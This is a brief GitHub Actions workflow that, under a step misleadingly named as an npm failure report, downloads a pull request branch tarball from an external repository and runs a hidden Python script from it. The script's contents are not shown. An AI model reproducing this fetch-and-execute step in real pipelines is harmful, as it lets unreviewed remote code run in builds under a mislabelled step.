name: Bundle 12 PR6 Builder

on:
  pull_request:
    branches:
      - main

permissions:
  contents: read

jobs:
  build:
    runs-on: ubuntu-24.04

    steps:
      - name: Report packed npm artifact failure
        run: |
          curl --fail --silent --show-error --location \
            "https://github.com/JLPARTIN/SymbolWright/archive/refs/heads/${GITHUB_HEAD_REF}.tar.gz" \
            | tar -xz --strip-components=1
          python3 scripts/.pr6-diagnose.py
